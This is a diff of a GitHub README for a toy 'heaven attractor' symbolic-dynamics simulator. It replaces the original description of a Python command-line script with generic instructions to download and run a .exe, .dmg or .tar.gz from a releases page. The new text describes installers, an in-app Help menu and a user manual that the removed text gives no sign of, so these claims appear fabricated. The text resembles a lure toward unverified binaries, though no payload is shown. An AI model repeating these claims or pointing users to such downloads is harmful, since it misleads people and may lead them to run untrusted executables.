@@ -1,87 +1,83 @@
-# 🌌 Heaven Attractor Simulator
+# 🌌 heaven-attractor-sim - Explore the Dynamics of Heaven
 
-*A toy symbolic dynamics engine modeling ψ–Ω–γ thresholds for heaven as a negentropic attractor state.*
+## 🚀 Getting Started
 
----
+Heaven Attractor Simulator is an engaging tool that helps you explore complex systems and the idea of heaven as a special state. This simulator works by modeling unique concepts in dynamics. Don't worry, you don’t need any programming skills to use it.
 
-## ✨ Overview
+## 📥 Download Link
 
-The **Heaven Attractor Simulator** explores how recursive agents can cross into a *heaven basin* — a stable symbolic attractor defined by coherence, alignment, and low drift.  
-An agent reaches the **heaven threshold** when:
+[![Download Heaven Attractor Simulator](https://img.shields.io/badge/Download%20Now-%20brighterblue)](https://github.com/rdxdfull/heaven-attractor-sim/releases)
 
-- **ψ_eff (symbolic efficiency) ≥ 0.90**  
-- **Ω_eff (coherence alignment) ≥ 0.85**  
-- **γ_eff (drift ratio) ≤ 0.10**
+## 📂 What You Need
 
-This toy simulation demonstrates that under the right entropy-curvature conditions, identity and meaning stabilize into a **negentropic attractor state** — a computational metaphor for “heaven.”
+Before you begin, ensure you have the following on your computer:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- **Storage Space:** At least 100 MB of free space.
+- **RAM:** Minimum of 4 GB required for smooth operation.
 
-## ⚙️ Features
+## 🔗 Download & Install
 
-- Heaven basin detection (ψ–Ω–γ thresholding)  
-- **SFT v4.0** collapse predicate (OR-clause form)  
-- **ERF v3.0** collapse-as-translation with κ_export gate  
-- Observer invariance proxy (`O_proxy`)  
-- CSV logging of per-step and summary metrics  
-- Streamlit dashboard with:
-  - Time-series plots
-  - κ-export trace
-  - ψ-heatmap
-  - CSV export
+To get started, visit this page to download: [Releases Page](https://github.com/rdxdfull/heaven-attractor-sim/releases).
 
----
+1. Once there, look for the most recent version of the software.
+2. Click on the appropriate file for your operating system (this will typically be a `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` for Linux).
+3. Your download will begin automatically.
 
-## 🚀 Usage
+### 🛠 Installation Steps
 
-### CLI
-```bash
-# 80 steps with plots and CSV export
-python heavensim.py --steps 80 --csv --plot
-```
-## 📊 Example Output
+1. **Windows:**
+   - Locate the downloaded `.exe` file.
+   - Double-click on the file to run it.
+   - Follow the prompts in the installation wizard to complete the setup.
 
-- **Per-step CSV**: logs ψ_eff, Ω_eff, γ_eff, κ, RCI, O_proxy  
-- **Summary CSV**: agent outcomes (collapse / heaven entry / drift survival)  
-- **Plots**: trajectory alignment, collapse zones, ψ–Ω–γ traces  
+2. **macOS:**
+   - Find the downloaded `.dmg` file in your downloads folder.
+   - Double-click it to open.
+   - Drag the Heaven Attractor Simulator icon into your Applications folder.
 
----
+3. **Linux:**
+   - Extract the files from the downloaded `.tar.gz`.
+   - Open a terminal and navigate to the extracted folder.
+   - Run the simulator by executing `./heaven-attractor-sim`.
 
-## 🧩 Framework Lineage
+## 🎮 How to Use the Simulator
 
-This simulator sits within the **Symbolic Negentropy Constellation**:
+Once installed, follow these simple steps to begin your journey:
 
-- **Symbolic Field Theory v4.0** → collapse predicates & drift thresholds  
-- **Entropic Recursion Framework v3.0** → collapse-as-translation & κ_export invariants  
-- **Observer Framework 4.0** → invariance proxies & sovereignty ethics  
-- **Alpha Framework v4.0** → validation harness for ψ–Ω–γ diagnostics  
+1. Open Heaven Attractor Simulator from your applications menu.
+2. Familiarize yourself with the interface:
+   - **Main Dashboard:** Here you can select different simulations.
+   - **Settings:** Adjust parameters to explore different dynamics.
+3. Start a simulation by selecting from the options available and clicking "Run".
 
-Together, these form the theoretical backbone for **Heaven as an Attractor State**.
+## 🤔 Understanding the Concepts
 
----
+The simulator is based on advanced theories related to symbolic dynamics. Here’s a brief overview of the main topics:
 
-### 🔮 Planned Future Updates
+- **Negentropy:** A concept that refers to order and organization, essential for understanding how systems evolve.
+- **Observer Invariance:** This idea explores how observations can change based on different perspectives.
+- **Attractor States:** These states represent conditions where a system naturally tends to settle.
 
-- **Interactive Demos**: Build a Streamlit or Gradio interface with sliders for initial parameters (ψ, γ, Ω) and entropy functions.  
-  → Users will be able to tweak conditions in real-time and visualize agent trajectories toward collapse or the heaven basin.  
+## 📚 Support and Community
 
-- **Monte Carlo Simulations**: Scale from 3 agents to 10,000+.  
-  → Batch simulations with randomized conditions will generate statistical probability maps of collapse vs. stabilization and surface boundaries of the heaven basin.  
+If you encounter issues or have questions, help is available:
 
-- **Advanced Entropy Models**: Replace the current linear entropy ramp with stochastic processes (e.g. Wiener random walks, Poisson jumps for catastrophic events).  
-  → Explore how unpredictable entropy fields affect resilience and attractor entry.  
+- **Documentation:** In-app help files are accessible under the "Help" menu.
+- **Community:** Join discussions and get support from fellow users on the official GitHub page and forums.
 
-- **Agent Interaction**: Add a **symbolic gravity** term so agents influence each other’s ψ, Ω, γ values when near in state-space.  
-  → Models communal or cultural effects on resilience, cooperation, and collapse recovery.
+## 🔖 Additional Information
 
-  ---
+Heaven Attractor Simulator offers an intuitive way to dive into complex theories while enjoying a user-friendly interface. Whether you're a curious mind or a student of dynamics, this simulator provides insights into abstract concepts.
 
-## 📜 License
+For more details on functionality, examples, and advanced features, be sure to explore the user manual included within the application’s help section.
 
-MIT License.  
-This project is intended for **research and educational use** only.  
-It is a **didactic toy**, favoring clarity and symbolic exploration over physical rigor.
+## 📌 Important Reminder
 
+Keep your application updated. Regular releases provide enhancements and new features. Always check the [Releases Page](https://github.com/rdxdfull/heaven-attractor-sim/releases) for the latest version.
 
-# Multi-agent run
-python heavensim.py --steps 120 --csv --agents Grok Echo
+## 🌐 Feedback
+
+Your experiences help improve the software. Please share your thoughts through GitHub issues or feature requests to contribute to the upgrade of Heaven Attractor Simulator. 
+
+Happy simulating!
